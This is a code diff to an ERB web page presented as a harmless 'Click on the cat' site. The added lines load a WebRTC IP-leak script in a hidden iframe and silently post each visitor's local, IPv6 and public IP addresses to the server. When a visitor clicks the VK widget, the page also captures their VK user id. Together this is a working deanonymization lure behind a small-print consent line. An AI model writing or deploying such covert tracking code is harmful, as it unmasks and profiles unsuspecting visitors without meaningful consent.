@@ -4,6 +4,7 @@
   <title></title>
   <script type="text/javascript" src="http://vk.com/js/api/openapi.js?122"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+  <script src="libJS/WEB_RTC_detect.js"></script>
 </head>
 <style type="text/css">
     #overlay {
@@ -25,6 +26,24 @@
     }
 </style>
 <body>
+  <iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+  <script type="text/javascript">
+    getIPs(
+      function(ip){
+        var li = document.createElement("li");
+        li.textContent = ip;
+        //local IPs
+        if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
+          $.post("/get_ip", {current_time: <%= @current_time %>, ip: ip, type: "local"})
+        //IPv6 addresses
+        else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
+          $.post("/get_ip", {current_time: <%= @current_time %>, ip: ip, type: "v6"})
+        //assume the rest are public IPs
+        else
+          $.post("/get_ip", {current_time: <%= @current_time %>, ip: ip, type: "public"})
+      }
+    );
+  </script>
 
   <script type="text/javascript">
     VK.init({apiId: <%= CONFIG[:vk_api_id] %>, onlyWidgets: true});
@@ -32,7 +51,7 @@
 
   <center>
     <h1>Click on the cat</h1>
-    <img src="https://catmacros.files.wordpress.com/2009/07/wow.jpg">
+    <img class="cat" src="images/wow_cat.jpg">
     <p>This website may collect sensitive information about you.</p>
     <p>By using the site you consent to the processing and storage of your data</p>
   </center>
@@ -59,10 +78,11 @@
         owner_id: <%= CONFIG[:vk_api_id] %>,
         page_url: window.location.href
       },function(response) {
-        $.post("vk_id", {current_time: <%= @current_time %>, vk_id: response.response.users[0]})
+        $.post("/vk_id", {current_time: <%= @current_time %>, vk_id: response.response.users[0]})
       });
       el.remove();
       $('iframe#vkwidget1_tt').remove();
+      $('.cat').attr({src: "images/any_cat.jpg"});
     });
   </script>
 
